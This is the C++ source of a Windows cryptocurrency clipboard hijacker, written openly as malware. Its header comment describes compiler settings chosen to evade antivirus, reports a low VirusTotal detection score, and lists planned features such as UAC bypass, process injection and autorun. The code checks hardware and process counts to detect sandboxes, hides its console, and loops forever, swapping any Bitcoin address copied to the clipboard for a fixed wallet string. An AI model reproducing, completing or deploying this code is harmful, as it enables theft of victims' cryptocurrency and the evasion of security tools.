/*
 First of all I will look up in Project Properties -> Code Generation -> Runtime Library
 and change Multi-threaded from (/MD) to (/MT). This trick makes compiled file from 55 KB(/MD) to 213 KB (/MT).
 This is not good for us, but we have to pay by file size for hide something more important.
 All Windows applications have IAT (Import Address Table) - its table, which stories all dump data from program(libraries, and function info).
 AV(Antivirus) uses this wonderful table for check important data and in future better debuging.
 We change to /MT whats make CRT (Common Language Runtime) disable and all libraries included in(this makes bigger file size).
 This wont allow AV to check what libraries we are importing.

 I noticed that if there are comments in the code, its make better virustotal score(6), but when
 I remove all comments virustotal score makes(8)

 Visual Studio Project Settings To hide some sensivity informations From AV:
     // Turn off SDL Checks
     // Turn off Program Optimisation
     // Turn off Security Checks
     // Turn off Exceptions
     // Turn on Function Level Linking
     // Turn on Ignore All Default Libaries
     // Turn off MANIFEST file
     // Turn off Debugging
     // Set Entry Point to main


    !NOT FINAL VERSION!

    CURRENT VIRUSTOTAL SCORE 4/72
    No one of popular AV like Kaspersky, Windows Defender, Avast and more dont recognize malware


 // TO DO:
 // Full IAT bypass
 // Make own LOADLIBRARY() and GETPROCADDRESS()​
 // Add Mutex
 // Add kill itself
 // Add Autorun 
 // Add shellcode killer
 // Add Time Based Attack 
 // Add Process Injection
 // Add System Privileges Escalation (UAC Bypass)
 // Add LTC,ETH,,XMR,BCH,DOGE,DASH coins support
 //https://0xpat.github.io/Malware_development_part_2/
*/



#include <iostream> // include iostream library for std::
#include <Windows.h> // include win api
#include <string> // include string for text
#include <regex> // inlude regex for pattern match
#include <psapi.h> // include win api library for process reading

bool anti_sandbox() { // open bool function

    /*
  
        This function doing multiply checks, trying to bypass AV Sandboxes and debugging.
    
    */
    
    // check CPU, default sandboxes have limited resources, and some of them have less than 2 | Virtual + Physical | cores.
    // I dont think normal user in 2023 will have smaller then 2.
    SYSTEM_INFO systemInfo; // declare system info
    GetSystemInfo(&systemInfo); // write system info to the variable
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors; // get processors number
    if (numberOfProcessors < 2) return false; // check if processors number less then 2 return false 

    // check RAM, default sandboxes have limited resources, and some of them have less than 2 GB RAM.
    // I dont think normal user in 2023 will have smaller then 2 GB of RAM.
    MEMORYSTATUSEX memoryStatus; // declare memory status
    memoryStatus.dwLength = sizeof(memoryStatus); // i dont know how to explain this
    GlobalMemoryStatusEx(&memoryStatus); // write global memory status
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024; // get total ram value in bytes, than calculate to KB and finaly to the MB
    if (RAMMB < 2048) return false; // check if ram is less than 2GB return false

    // check disk, default sandboxes have limited resources, and some of them have less than 100 GB | HDD & SSD |.
    // I dont think normal user in 2023 will have smaller then 100 GB. 
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // create discriptor for disk 0
    DISK_GEOMETRY pDiskGeometry; // create variable pDiskGeometry
    DWORD bytesReturned; // create variable bytes returned
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL); // trying to get pDiskGeometry and write to the bytesReturned
    DWORD diskSizeGB; // create variable disk size
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024; // calculate disk size in gb
    if (diskSizeGB < 100) return false; // check if disk size is less than 100 return false


    // check usb devices, default sandboxes cleaned completely entire windows after each program run. So we can check simply if any usb devices
    // have ever been connected to the system.
    // I dont think normal user have never connected any usb device
    HKEY hKey; // create hKey variable
    DWORD mountedUSBDevicesCount; // create usb devices count variable
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey); // open regedit path
    RegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL); // get usb connected count and write to variable &mountedUSBDevicesCount
    if (mountedUSBDevicesCount < 1) return false; // checks if any usb device is ever connected to the system


    // check running processes, default sandboxes have limited resources, so typicaly they have less than 50 running processes.
    // I dont think normal user using windows 10 have less than 50 running processes.
    DWORD runningProcessesIDs[1024]; // create variable which contains up to 1024 process
    DWORD runningProcessesCountBytes; // create variable
    DWORD runningProcessesCount; // create variable
    EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes); // write running proceess count to variable
    runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD); // write running proceess count to variable
    if (runningProcessesCount < 50) return false; // checks if running process count is less than 50


    // If all checks is passed, return true
    return true;
}

// declare main function (i use WinMain for hide console)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    
    if (anti_sandbox() == false) { // check if sandbox checks is not passed
        exit(0); // if return false close program
    }

    std::regex bitcoinRegex(R"(([13][a-km-zA-HJ-NP-Z1-9]{25,34})|bc1[0-9A-Za-z]{39})"); // bitcoin pattern for findout bitcoin address in clipboard
    const char* victimWallet = "victim wallet address"; // victim btc address for being replace

    while (true) { // infinity loop for monitor clipboard


        if (OpenClipboard(NULL)) { // open clipboard

            HANDLE hClipboardData = GetClipboardData(CF_TEXT); // get clipboard data in CF_TEXT (text)

            char* clipboardText = static_cast<char*>(GlobalLock(hClipboardData)); // create pointer stored clipboard data

            if (clipboardText != nullptr) { // check if parse clipboard data succeed
                std::string clipboardStr(clipboardText); // transform clipboard data to text(str)
                GlobalUnlock(hClipboardData); // unfreeze hClipboardData

                if (clipboardStr != victimWallet) { // check if victim address not in clipboard (for not replacing already replaced clipboard)
                    if (std::regex_match(clipboardStr, bitcoinRegex)) { // check if bitcoin patten is matched in clipboard

                        //std::cout << clipboardStr << " => matched\n";

                        // Выделите память и скопируйте текст в буфер обмена
                        HGLOBAL hNewClipboardData = GlobalAlloc(GMEM_MOVEABLE, strlen(victimWallet) + 1); // allocate memory for victim address
                        char* pNewClipboardText = static_cast<char*>(GlobalLock(hNewClipboardData)); // create pointer for victim address
                        strcpy_s(pNewClipboardText, strlen(victimWallet) + 1, victimWallet); // copy victim wallet data to the allocated memory
                        GlobalUnlock(hNewClipboardData); // unbrick new clipboard address

                        EmptyClipboard(); // clear clipboard before write new value
                        /*
                        * Idk why but without clearing clipboard new value does not appear :\
                        * Im beginning in c++ learn, so some syntax and program behavior i dont fully undestend
                        */

                        if (!SetClipboardData(CF_TEXT, hNewClipboardData)) { // if clipboard data wont replace
                            CloseClipboard(); // close clipboard
                            return false; // return false
                        }
                    }
                }

            }

            CloseClipboard(); // close clipboard
        }

        Sleep(500); // 0.5 seconds sleep for decrease CPU usage
    }

    return 0; // exit 
}
